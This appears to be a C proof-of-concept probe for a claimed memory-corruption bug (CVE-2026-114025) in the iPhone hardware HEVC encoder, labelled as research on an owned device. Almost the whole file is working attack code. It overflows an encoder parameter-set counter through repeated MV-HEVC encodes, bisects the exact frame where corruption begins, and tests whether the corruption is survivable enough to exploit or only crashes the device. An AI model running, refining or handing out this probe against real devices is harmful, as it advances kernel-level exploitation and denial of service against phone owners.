/*
 * ave_counter_overflow.c — CVE-2026-114025 Counter Overflow Probe
 *
 * Educational research on owned device (iPhone Duo, A20 Pro, iOS 27.1).
 *
 * Key finding (session 6): The VPS/SPS/PPS entry index comes from a COUNTER
 * at table_base+0x0 (uint32), NOT from the layer_id. Counter increments +1
 * per NAL unit written. Each MV-HEVC encode produces ~3 entries (VPS+SPS+PPS).
 *
 * After 256 entries (~86 encodes), writes overflow the 256-entry sub-object
 * boundary and corrupt unknown fields in the HEVC buffer at offsets
 * 0x4770 to 0x7DDC.
 *
 * This probe encodes increasing numbers of frames to:
 *   1. Confirm counter-based overflow occurs
 *   2. Find the exact frame count where corruption starts
 *   3. Observe crash patterns or error codes indicating corruption type
 *   4. Determine if the overflow is survivable (useful) or fatal (DoS only)
 *
 * Build: xcrun -sdk iphoneos clang -arch arm64e -miphoneos-version-min=17.0
 *        -framework VideoToolbox -framework CoreVideo -framework CoreMedia
 *        -framework CoreFoundation -framework IOKit
 *        -o AVECounterOverflow ave_counter_overflow.c -Wno-deprecated-declarations
 *
 * Bundle ID: com.research.avecounteroverflow
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <mach/mach.h>
#include <CoreFoundation/CoreFoundation.h>
#include <VideoToolbox/VideoToolbox.h>
#include <CoreVideo/CoreVideo.h>

static FILE *g_log = NULL;
static volatile int g_encode_done = 0;
static volatile int g_cb_status = -999;
static volatile int g_cb_count = 0;

static void rlog(const char *fmt, ...) {
    va_list ap;
    va_start(ap, fmt);
    if (g_log) { vfprintf(g_log, fmt, ap); fflush(g_log); }
    va_end(ap);
    va_start(ap, fmt);
    vprintf(fmt, ap);
    fflush(stdout);
    va_end(ap);
}

static void encode_cb(void *ctx, void *src, OSStatus status,
                      VTEncodeInfoFlags flags, CMSampleBufferRef buf) {
    g_cb_status = (int)status;
    g_cb_count++;
    g_encode_done = 1;
    if (status != 0) {
        printf("  [CB#%d] ERROR status=%d flags=0x%x\n", g_cb_count, (int)status, (unsigned)flags);
    }
}

static CVPixelBufferRef create_pb(int w, int h) {
    CVPixelBufferRef pb = NULL;
    CFMutableDictionaryRef attrs = CFDictionaryCreateMutable(
        NULL, 0, &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
    CFDictionaryRef iosurf = CFDictionaryCreate(NULL, NULL, NULL, 0,
        &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
    CFDictionarySetValue(attrs, kCVPixelBufferIOSurfacePropertiesKey, iosurf);
    CVReturn ret = CVPixelBufferCreate(NULL, w, h, kCVPixelFormatType_32BGRA, attrs, &pb);
    CFRelease(iosurf); CFRelease(attrs);
    if (ret != kCVReturnSuccess) return NULL;
    CVPixelBufferLockBaseAddress(pb, 0);
    void *base = CVPixelBufferGetBaseAddress(pb);
    if (base) memset(base, 0x42, w * h * 4);
    CVPixelBufferUnlockBaseAddress(pb, 0);
    return pb;
}

static VTCompressionSessionRef create_mvhevc_encoder(int w, int h, int layer_id) {
    VTCompressionSessionRef session = NULL;
    CFMutableDictionaryRef enc_spec = CFDictionaryCreateMutable(
        NULL, 0, &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
    CFDictionarySetValue(enc_spec, CFSTR("EnableHardwareAcceleratedVideoEncoder"),
                         kCFBooleanTrue);
    CFDictionarySetValue(enc_spec, CFSTR("RequireHardwareAcceleratedVideoEncoder"),
                         kCFBooleanTrue);

    OSStatus st = VTCompressionSessionCreate(NULL, w, h,
        kCMVideoCodecType_HEVC, enc_spec, NULL, NULL,
        encode_cb, NULL, &session);
    CFRelease(enc_spec);

    if (st != noErr || !session) {
        rlog("CREATE FAILED: %d\n", (int)st);
        return NULL;
    }

    VTSessionSetProperty(session, kVTCompressionPropertyKey_RealTime, kCFBooleanTrue);

    int kf = 1;
    CFNumberRef kfn = CFNumberCreate(NULL, kCFNumberIntType, &kf);
    VTSessionSetProperty(session, kVTCompressionPropertyKey_MaxKeyFrameInterval, kfn);
    CFRelease(kfn);
    VTSessionSetProperty(session, kVTCompressionPropertyKey_AllowFrameReordering, kCFBooleanFalse);

    int base = 0;
    CFNumberRef ids[2];
    ids[0] = CFNumberCreate(NULL, kCFNumberIntType, &base);
    ids[1] = CFNumberCreate(NULL, kCFNumberIntType, &layer_id);
    CFArrayRef arr = CFArrayCreate(NULL, (const void **)ids, 2, &kCFTypeArrayCallBacks);
    VTSessionSetProperty(session, CFSTR("MVHEVCVideoLayerIDs"), arr);
    CFRelease(arr); CFRelease(ids[0]); CFRelease(ids[1]);

    CFNumberRef left = CFNumberCreate(NULL, kCFNumberIntType, &base);
    CFNumberRef right = CFNumberCreate(NULL, kCFNumberIntType, &layer_id);
    VTSessionSetProperty(session, CFSTR("MVHEVCLeftEyeID"), left);
    VTSessionSetProperty(session, CFSTR("MVHEVCRightEyeID"), right);
    CFRelease(left); CFRelease(right);

    st = VTCompressionSessionPrepareToEncodeFrames(session);
    if (st != noErr) {
        rlog("PREPARE FAILED: %d\n", (int)st);
        VTCompressionSessionInvalidate(session);
        CFRelease(session);
        return NULL;
    }
    return session;
}

static int encode_n_frames(VTCompressionSessionRef session, int n, int w, int h) {
    int first_error = n;
    int errors = 0;

    for (int i = 0; i < n; i++) {
        CVPixelBufferRef pb = create_pb(w, h);
        if (!pb) {
            rlog("  [%d] pixel buffer creation failed\n", i);
            if (first_error == n) first_error = i;
            errors++;
            continue;
        }

        g_encode_done = 0;
        g_cb_status = -999;
        CMTime pts = CMTimeMake(i, 30);
        CMTime dur = CMTimeMake(1, 30);

        OSStatus st = VTCompressionSessionEncodeFrame(session, pb, pts, dur, NULL, NULL, NULL);
        if (st != noErr) {
            rlog("  [%d] EncodeFrame FAILED: %d (entries ~%d)\n", i, (int)st, i * 3);
            CVPixelBufferRelease(pb);
            if (first_error == n) first_error = i;
            errors++;
            if (errors >= 5) {
                rlog("  Too many errors, stopping at frame %d\n", i);
                break;
            }
            continue;
        }

        for (int w_i = 0; w_i < 100 && !g_encode_done; w_i++) usleep(10000);

        if (g_cb_status != 0 && g_cb_status != -999) {
            rlog("  [%d] callback error: %d (entries ~%d)\n", i, g_cb_status, i * 3);
            if (first_error == n) first_error = i;
            errors++;
        }

        CVPixelBufferRelease(pb);

        if ((i + 1) % 10 == 0 || (i >= 80 && i <= 100) || i == 0) {
            rlog("  [frame %d] OK (%d errors so far)\n", i, errors);
        }
    }

    rlog("  Flushing...\n");
    VTCompressionSessionCompleteFrames(session, kCMTimeInvalid);
    usleep(500000);

    return first_error;
}

static void phase_gradual(int target_frames, int w, int h) {
    rlog("\n=== GRADUAL COUNTER OVERFLOW: target=%d frames ===\n", target_frames);
    rlog("Each MV-HEVC encode produces ~3 NAL entries (VPS+SPS+PPS)\n");
    rlog("256-entry boundary at ~86 encodes (258 entries)\n");
    rlog("Cumsum limit (0x801) at ~228 encodes (683 entries)\n\n");

    VTCompressionSessionRef session = create_mvhevc_encoder(w, h, 1);
    if (!session) {
        rlog("FAILED to create encoder\n");
        return;
    }

    rlog("[1] Encoding %d frames...\n", target_frames);
    int first_err = encode_n_frames(session, target_frames, w, h);

    if (first_err < target_frames) {
        int entries_at_err = first_err * 3;
        rlog("\n** FIRST ERROR at frame %d (est. %d entries)\n", first_err, entries_at_err);
        if (entries_at_err >= 254 && entries_at_err <= 262) {
            rlog("** ERROR NEAR 256-ENTRY BOUNDARY — counter overflow confirmed!\n");
        } else if (entries_at_err >= 680 && entries_at_err <= 690) {
            rlog("** ERROR NEAR CUMSUM LIMIT — cumulative sum overflow\n");
        }
    } else {
        rlog("\n** ALL %d FRAMES SUCCEEDED (est. %d entries)\n",
             target_frames, target_frames * 3);
        rlog("** Counter overflow occurred SILENTLY — corruption without crash\n");
        rlog("** This means intra-buffer fields at 0x4770+ survived corruption\n");
    }

    rlog("[2] Post-overflow encode test...\n");
    g_encode_done = 0;
    g_cb_status = -999;
    CVPixelBufferRef pb = create_pb(w, h);
    if (pb) {
        CMTime pts = CMTimeMake(target_frames, 30);
        CMTime dur = CMTimeMake(1, 30);
        OSStatus st = VTCompressionSessionEncodeFrame(session, pb, pts, dur, NULL, NULL, NULL);
        for (int i = 0; i < 100 && !g_encode_done; i++) usleep(10000);
        rlog("  Post-overflow encode: submit=%d, cb=%d\n", (int)st, g_cb_status);
        CVPixelBufferRelease(pb);
    }

    rlog("[3] Cleanup...\n");
    VTCompressionSessionInvalidate(session);
    CFRelease(session);
}

static void phase_bisect(int lo, int hi, int w, int h) {
    rlog("\n=== BISECT: Finding exact overflow frame in [%d, %d] ===\n", lo, hi);

    while (lo < hi) {
        int mid = (lo + hi) / 2;
        rlog("\n--- Testing %d frames (est. %d entries) ---\n", mid, mid * 3);

        VTCompressionSessionRef session = create_mvhevc_encoder(w, h, 1);
        if (!session) {
            rlog("ENCODER CREATE FAILED at mid=%d\n", mid);
            break;
        }

        int first_err = encode_n_frames(session, mid, w, h);
        VTCompressionSessionInvalidate(session);
        CFRelease(session);

        if (first_err < mid) {
            rlog("  Error at frame %d → hi=%d\n", first_err, first_err);
            hi = first_err;
        } else {
            rlog("  All OK → lo=%d\n", mid + 1);
            lo = mid + 1;
        }

        usleep(200000);
    }

    rlog("\n** BISECT RESULT: overflow starts at frame %d (est. %d entries)\n", lo, lo * 3);
}

int main(int argc, char *argv[]) {
    char logpath[512];
    snprintf(logpath, sizeof(logpath), "%s/Documents/ave_counter_overflow.txt",
             getenv("HOME") ? getenv("HOME") : "/tmp");
    g_log = fopen(logpath, "w");

    rlog("=== CVE-2026-114025 Counter Overflow Probe ===\n");
    rlog("Tests counter-based VPS/SPS/PPS table overflow\n");
    rlog("256-entry limit → ~86 encodes to reach boundary\n");
    rlog("Time: %s\n", __TIMESTAMP__);
    rlog("PID: %d\n", getpid());

    const char *mode = (argc > 1) ? argv[1] : "help";
    int W = 128, H = 128;

    if (strcmp(mode, "safe") == 0) {
        rlog("\n== SAFE: 50 encodes (150 entries, within bounds) ==\n");
        phase_gradual(50, W, H);

    } else if (strcmp(mode, "boundary") == 0) {
        rlog("\n== BOUNDARY: 100 encodes (300 entries, crosses 256) ==\n");
        phase_gradual(100, W, H);

    } else if (strcmp(mode, "deep") == 0) {
        rlog("\n== DEEP: 250 encodes (750 entries, near cumsum limit) ==\n");
        phase_gradual(250, W, H);

    } else if (strcmp(mode, "max") == 0) {
        rlog("\n== MAX: 500 encodes (1500 entries, deep overflow) ==\n");
        phase_gradual(500, W, H);

    } else if (strcmp(mode, "bisect") == 0) {
        rlog("\n== BISECT: Finding exact overflow frame ==\n");
        phase_bisect(80, 100, W, H);

    } else if (strcmp(mode, "bisect_wide") == 0) {
        rlog("\n== BISECT_WIDE: If entries/encode=1, boundary at ~256 encodes ==\n");
        rlog("VPS/SPS/PPS may use separate tables (1 entry each per encode)\n");
        phase_bisect(240, 270, W, H);

    } else {
        rlog("Usage: AVECounterOverflow <mode>\n");
        rlog("  safe       -- 50 encodes (within 256-entry limit)\n");
        rlog("  boundary   -- 100 encodes (crosses 256-entry boundary)\n");
        rlog("  deep       -- 250 encodes (near cumsum limit)\n");
        rlog("  max        -- 500 encodes (deep overflow)\n");
        rlog("  bisect     -- binary search for exact overflow frame\n");
        rlog("  bisect_wide -- binary search at 240-270 (if 1 entry/encode)\n");
        rlog("\nKey thresholds:\n");
        rlog("  256 entries (~86 or ~256 encodes): sub-object boundary\n");
        rlog("  683 entries (~228 or ~683 encodes): cumsum limit (0x801)\n");
    }

    rlog("\n=== Probe complete ===\n");
    if (g_log) fclose(g_log);
    return 0;
}
